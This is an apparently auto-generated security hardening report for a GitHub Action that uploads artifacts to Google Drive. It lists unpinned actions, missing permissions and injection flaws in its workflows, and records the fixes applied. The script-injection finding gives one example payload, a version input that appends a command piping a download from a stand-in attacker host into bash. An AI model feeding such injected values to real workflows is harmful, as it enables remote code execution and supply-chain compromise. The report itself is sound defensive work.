<!-- markdownlint-disable -->

# Hardening Report: Jumbo810--Upload_Github_Artifacts_TO_GDrive/v2.3.5

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **Jumbo810--Upload_Github_Artifacts_TO_GDrive/v2.3.5** was hardened automatically. 4 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

All workflow files pin third-party actions to mutable version tags instead of immutable 40-character SHA commits, making the workflows vulnerable to supply-chain attacks if a tag is moved. Unpinned references found:
- actions/checkout@v6
- actions/setup-node@v6.1.0
- actions/upload-artifact@v6
- mindsers/changelog-reader-action@v2
- softprops/action-gh-release@v2
- actions/github-script@v8

Locations:

- `.github/workflows/ci.yml:24`
- `.github/workflows/ci.yml:28`
- `.github/workflows/ci.yml:47`
- `.github/workflows/ci.yml:51`
- `.github/workflows/ci.yml:60`
- `.github/workflows/manual-release.yml:15`
- `.github/workflows/manual-release.yml:19`
- `.github/workflows/manual-release.yml:55`
- `.github/workflows/manual-release.yml:62`
- `.github/workflows/release.yml:14`
- `.github/workflows/release.yml:18`
- `.github/workflows/release.yml:36`
- `.github/workflows/release.yml:43`
- `.github/workflows/test.yml:13`
- `.github/workflows/test.yml:17`
- `.github/workflows/update-dist.yml:16`
- `.github/workflows/update-dist.yml:22`
- `.github/workflows/update-dist.yml:88`
- `.github/workflows/update-dist.yml:96`

### missing-permissions (severity: medium)

None of the workflow files declare a top-level or job-level `permissions:` block. Without explicit permissions, workflows run with the default (often write-all) token permissions, violating the principle of least privilege.

Locations:

- `.github/workflows/ci.yml:1`
- `.github/workflows/manual-release.yml:1`
- `.github/workflows/release.yml:1`
- `.github/workflows/test.yml:1`
- `.github/workflows/update-dist.yml:1`

### script-injection (severity: high)

Rule (a): GitHub Actions expressions are directly interpolated inside `run:` shell command strings, allowing an attacker to inject arbitrary shell commands.

1. manual-release.yml — `${{ inputs.version }}` is interpolated directly in multiple shell commands inside a `run:` block:
   - `git commit -m "chore: Update dist for release ${{ inputs.version }} [skip ci]"`
   - `git tag ${{ inputs.version }}`
   - `git push origin ${{ inputs.version }}`
   - `echo "VERSION=${{ inputs.version }}" | sed 's/v//' >> $GITHUB_OUTPUT`
   A malicious `version` input (e.g. `v1.0; curl attacker.com | bash`) would execute arbitrary commands.

2. update-dist.yml — `${{ github.event.workflow_run.head_commit.message }}` is interpolated directly in a `run:` block:
   - `COMMIT_MSG="${{ github.event.workflow_run.head_commit.message }}"`
   The commit message is attacker-controlled (via a PR) and can contain shell metacharacters.

3. test.yml — `${{ steps.test_upload.outcome }}` is interpolated directly in a `run:` block:
   - `if [ "${{ steps.test_upload.outcome }}" == "success" ]; then`

Locations:

- `.github/workflows/manual-release.yml:43`
- `.github/workflows/manual-release.yml:47`
- `.github/workflows/manual-release.yml:48`
- `.github/workflows/manual-release.yml:54`
- `.github/workflows/update-dist.yml:57`
- `.github/workflows/test.yml:46`

### github-env-injection (severity: high)

Untrusted input values are written to GitHub special environment files (`$GITHUB_OUTPUT`, `$GITHUB_ENV`) without the required sanitization step (`printf '%s' ... | tr -d '\n\r'`), enabling environment variable injection attacks.

1. manual-release.yml — `${{ inputs.version }}` (user-supplied via workflow_dispatch) is written directly to `$GITHUB_OUTPUT` without sanitization:
   `echo "VERSION=${{ inputs.version }}" | sed 's/v//' >> $GITHUB_OUTPUT`
   A newline in `inputs.version` can inject arbitrary output variables.

2. update-dist.yml — `${{ github.event.workflow_run.head_commit.message }}` is interpolated into `COMMIT_MSG`, and a value derived from it (`$VERSION`) is written to `$GITHUB_ENV` without sanitization:
   `echo "RELEASE_VERSION=$VERSION" >> $GITHUB_ENV`
   Since `$VERSION` is extracted from the attacker-controlled commit message, a crafted commit message containing a newline can inject arbitrary environment variables.

Locations:

- `.github/workflows/manual-release.yml:54`
- `.github/workflows/update-dist.yml:57`
- `.github/workflows/update-dist.yml:76`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, missing-permissions, script-injection, github-env-injection

**Notes:**

Fixed all five workflow files:

**unpinned-uses**: Pinned all action references to full SHA commits:
- actions/checkout@v6 → @df4cb1c069e1874edd31b4311f1884172cec0e10
- actions/setup-node@v6.1.0 → @395ad3262231945c25e8478fd5baf05154b1d79f
- actions/upload-artifact@v6 → @b7c566a772e6b6bfb58ed0dc250532a479d7789f
- mindsers/changelog-reader-action@v2 → @1faaf50aa09d5793d9a100819973df801febfb31
- softprops/action-gh-release@v2 → @3bb12739c298aeb8a4eeaf626c5b8d85266b0e65
- actions/github-script@v8 → @ed597411d8f924073f98dfc5c65a23a2325f34cd

**missing-permissions**: Added `permissions: {}` at top-level and minimal job-level permissions (`contents: read` for lint/build/test jobs, `contents: write` for release/tag jobs).

**script-injection**: 
- manual-release.yml: Moved `${{ inputs.version }}` into `INPUT_VERSION` env var in both the 'Commit Dist and Tag' and 'Get version without v' steps.
- update-dist.yml: Moved `${{ github.event.workflow_run.head_commit.message }}` into `RAW_COMMIT_MSG` env var in the 'Commit and push changes' step.
- test.yml: Moved `${{ steps.test_upload.outcome }}` into `TEST_UPLOAD_OUTCOME` env var in the 'Check if upload was attempted' step.

**github-env-injection**: 
- manual-release.yml: The 'Get version without v' step now sanitizes the version with `printf '%s' ... | tr -d '\n\r'` before writing to $GITHUB_OUTPUT.
- update-dist.yml: The commit message is sanitized with `tr -d '\n\r'` before use; the VERSION extracted from it is also sanitized before writing to $GITHUB_ENV. The 'Get version without v' step also sanitizes before writing to $GITHUB_OUTPUT.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed the unquoted `$COMMIT_MSG` variable in the bash conditional at line 68 of `.github/workflows/update-dist.yml`. Changed `if [[ $COMMIT_MSG == release:\ v* ]]` to `if [[ "$COMMIT_MSG" == release:\ v* ]]`. This ensures the untrusted commit message value (derived from `${{ github.event.workflow_run.head_commit.message }}`) is properly double-quoted, preventing glob/pattern expansion in the bash `[[ ]]` conditional.

